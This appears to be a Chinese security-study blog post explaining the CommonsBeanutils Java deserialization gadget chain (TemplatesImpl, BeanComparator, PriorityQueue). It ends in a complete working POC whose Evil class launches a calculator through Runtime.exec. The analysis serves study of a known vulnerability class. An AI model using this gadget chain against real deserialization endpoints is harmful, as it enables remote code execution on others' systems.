---
layout:     post                    # 使用的布局（不需要改）
title:      CommonsBeanutils反序列化学习               # 标题 
subtitle:    #副标题
date:       2022-03-08              # 时间
author:     Von                      # 作者
header-img: img/post-bg-cook.jpg
catalog: true                       # 是否归档
tags:                               #标签
    - Java
    - Web

---

# CommonsBeanutils是什么

Apache Commons Beanutils和之前我们学习的Commons Collections一样，是Apache Commons工具集下的另一个项目，它提供了对JavaBean的一些操作方法。

至于什么是JavaBean，其实指的是一种写法并且之前我们之前已经广泛接触到了：

```java
public class Student {
    private String name;
    private int id;

    public String getName() { return this.name; }
    public void setName(String name) { this.name = name; }

    public int getId() { return this.id; }
    public void setId(int id) { this.id = id; }
}
```

它包含若干个私有属性，这些属性通过读取和设置的两个方法来进行访问与修改（这两个方法称为getter和setter）。其中，getter的方法名以get开头，setter的方法名以set开头，全名符合骆驼式命名法（通常来说指属性的第一个字母要大写，如这里面的getName和setName）。

# getter的妙用

其实CB的反序列化链条和之前我们分析的CC链条有很多相似之处，首先他们都利用了

```java
TemplatesImpl#newTransformer() -> TemplatesImpl#getTransletInstance() -> TemplatesImpl#defineTransletClasses() -> TransletClassLoader#defineClass()
```

这条动态加载字节码的利用链，回顾下之前的相关POC：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

public class main {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException {
        TemplatesImpl template = new TemplatesImpl();
        setField("_name",template,"Von");
        setField("_bytecodes",template,new byte[][]{Files.readAllBytes(Paths.get("/Users/CC3/Evil.class"))});
        setField("_tfactory",template,new TransformerFactoryImpl());
        template.newTransformer();
    }

    public static void setField(String fieldname,Object obj,Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<TemplatesImpl> templatesClass = TemplatesImpl.class;
        Field declaredField = templatesClass.getDeclaredField(fieldname);
        declaredField.setAccessible(true);
        declaredField.set(obj,value);
    }
}
```

Evil类定义为：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Evil extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

首先我们往上走一步，搜索哪些方法调用了`newTransformer()`，在CC3中我们利用的是TrAXFilter的构造函数，而这里我们发现TemplatesImpl的getOutputProperties方法中也调用了`newTransformer()`

```java
public synchronized Properties getOutputProperties() {
  try {
    return newTransformer().getOutputProperties();
  }
  catch (TransformerConfigurationException e) {
    return null;
  }
}
```

我们发现TemplatesImpl正好有一个outputProperties的私有属性，那么`getOutputProperties()`其实是TemplatesImpl的一个gettar方法！

commons-beanutils中提供了一个静态方法`PropertyUtils.getProperty`，让使用者可以直接调用任意JavaBean的getter方法，比如：

```java
PropertyUtils.getProperty(new Student(), "name");
```

就会自动执行Student对象的getName()方法。

同理在这个例子中，我们可以将利用方法改为如下代码，也可执行命令：

```java
TemplatesImpl template = new TemplatesImpl();
setField("_name",template,"Von");
setField("_bytecodes",template,new byte[][]{Files.readAllBytes(Paths.get("/Users/CC3/Evil.class"))});
setField("_tfactory",template,new TransformerFactoryImpl());
PropertyUtils.getProperty(template, "outputProperties");
```

接下去我们继续寻找调用了`getProperty()`方法的利用点，发现`org.apache.commons.beanutils.BeanComparator`类中的`compare`方法调用了`getProperty()`方法

```
public int compare( T o1, T o2 ) {

    if ( property == null ) {
        // compare the actual objects
        return internalCompare( o1, o2 );
    }

    try {
        Object value1 = PropertyUtils.getProperty( o1, property );
        Object value2 = PropertyUtils.getProperty( o2, property );
        return internalCompare( value1, value2 );
    }
    catch ( IllegalAccessException iae ) {
        throw new RuntimeException( "IllegalAccessException: " + iae.toString() );
    }
    catch ( InvocationTargetException ite ) {
        throw new RuntimeException( "InvocationTargetException: " + ite.toString() );
    }
    catch ( NoSuchMethodException nsme ) {
        throw new RuntimeException( "NoSuchMethodException: " + nsme.toString() );
    }
}
```

# PriorityQueue

这里我们要做的是继续往上寻找调用了`compare()`方法的利用点，但是说实话这里调用点不少，事后诸葛亮的结果是发现

`java.util.PriorityQueue`中的`siftDownUsingComparator()`方法中调用了`compare()`方法：

```java
private void siftDownUsingComparator(int k, E x) {
  int half = size >>> 1;
  while (k < half) {
    int child = (k << 1) + 1;
    Object c = queue[child];
    int right = child + 1;
    if (right < size &&
        comparator.compare((E) c, (E) queue[right]) > 0)
      c = queue[child = right];
    if (comparator.compare(x, (E) c) <= 0)
      break;
    queue[k] = c;
    k = child;
  }
  queue[k] = x;
}
```

然后往上跟发现相同类中的`siftDown()`方法中调用了`siftDownUsingComparator()`

```
private void siftDown(int k, E x) {
    if (comparator != null)
        siftDownUsingComparator(k, x);
    else
        siftDownComparable(k, x);
}
```

然后`heapify()`方法中又调用了`siftDown()`

```
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

最后发现`java.util.PriorityQueue`居然自己实现`readObject()`并且调用了`heapify()`，自此完成了整条利用链的初步构造

```
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

我们从PriorityQueue（优先队列）的设计原理来理解这一过程：

1. 优先队列和普通队列的区别在于队列中的每个元素都有一个优先度，每次出队时都是优先度最高的元素出队。JDK中通过二叉堆（其实也是二叉树）这一数据结构来组织优先队列中的每个元素。

2. `readObject()`中通过`heapify()`重构整个堆以保证堆的结构在序列化前后没有变化，然后从最后一个非叶子节点开始进行`siftDown()`将元素进行下移（为什么是最后一个非叶子节点我们可以先不了解，只要理解为是要进行两个元素的比较然后视情况进行调整）

3. 在`siftDown()`中我们可以自己使用自己的comparator来进行不同类型元素的比较，跟进发现在`siftDownUsingComparator()`中的`comparator.compare()`进行了不同元素的比较。

comparator是一个实现了`Comparable`接口的对象，所以其实对于PriorityQueue的readObject方法这个反序列化利用点，关键就在于找到一个可利用的comparator对象，在CB链中我们利用的便是`org.apache.commons.beanutils.BeanComparator`

详细的PriorityQueue源码解析可以参考这篇文章：[PriorityQueue源码分析](https://www.cnblogs.com/linghu-java/p/9467805.html)

# 编写POC

接下来我们从利用链的开始来注意需要注意的地方：

首先是从构造函数出发：

```java
public PriorityQueue(int initialCapacity,
                     Comparator<? super E> comparator) {
  // Note: This restriction of at least one is not actually needed,
  // but continues for 1.5 compatibility
  if (initialCapacity < 1)
    throw new IllegalArgumentException();
  this.queue = new Object[initialCapacity];
  this.comparator = comparator;
}
```

我们发现我们可控的只有initialCapacity和comparator，而在heapify函数中，要进入循环，需要满足size大于等于2（默认值为int类型的初始指为0）。所以我们有两个思路，一个是直接利用反射修改size的属性值，另一个则是找到有没有修改size属性的public方法并且从外部调用。这里大部分文章都是利用了`add()`方法来达到修改`size`的目的，这里我们采用第一种方法，即直接修改`size`的属性

此外，我们还需要修改queue的属性（从后面`siftDownUsingComparator()`可以看出compare的元素其实都是从queue属性中拿出的），经过调试分析得知至少需要两个元素，最终POC为：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class main {
    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, InvocationTargetException, NoSuchMethodException, ClassNotFoundException {
        TemplatesImpl template = new TemplatesImpl();
        setField("_name",template,"Von");
        setField("_bytecodes",template,new byte[][]{Files.readAllBytes(Paths.get("/Users/luyanchen/Evil.class"))});
        setField("_tfactory",template,new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties");
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);
        setField("size",priorityQueue,2);
        setField("queue",priorityQueue,new Object[]{template,template});
        serialize(priorityQueue);
        unserialize();
    }

    public static void setField(String fieldname,Object obj,Object value) throws NoSuchFieldException, IllegalAccessException {
        Class targetclass = obj.getClass();
        Field declaredField = targetclass.getDeclaredField(fieldname);
        declaredField.setAccessible(true);
        declaredField.set(obj,value);
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get("ser.bin")));
        oos.writeObject(obj);
    }

    public static Object unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(Files.newInputStream(Paths.get("ser.bin")));
        Object obj = ois.readObject();
        return obj;
    }
}
```

这里有点需要注意的是PriorityQueue的queue属性虽然是用transient修饰的，但其在writeObject和readObject中都特意处理了并进行了写入，所以其实queue属性还是有被序列化并进行传输的：

```java
private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException {
// Write out element count, and any hidden stuff
s.defaultWriteObject();

// Write out array length, for compatibility with 1.5 version
s.writeInt(Math.max(2, size + 1));

// Write out all elements in the "proper order".
for (int i = 0; i < size; i++)
s.writeObject(queue[i]);
}

private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException {
// Read in size, and any hidden stuff
s.defaultReadObject();

// Read in (and discard) array length
s.readInt();

queue = new Object[size];

// Read in all elements.
for (int i = 0; i < size; i++)
queue[i] = s.readObject();

// Elements are guaranteed to be in "proper order", but the
// spec has never explained what that might be.
heapify();
}
```

# 参考文章

[CommonsBeanutils与无commons-collections的Shiro反序列化利用](https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html)

P神的JAVA安全漫谈

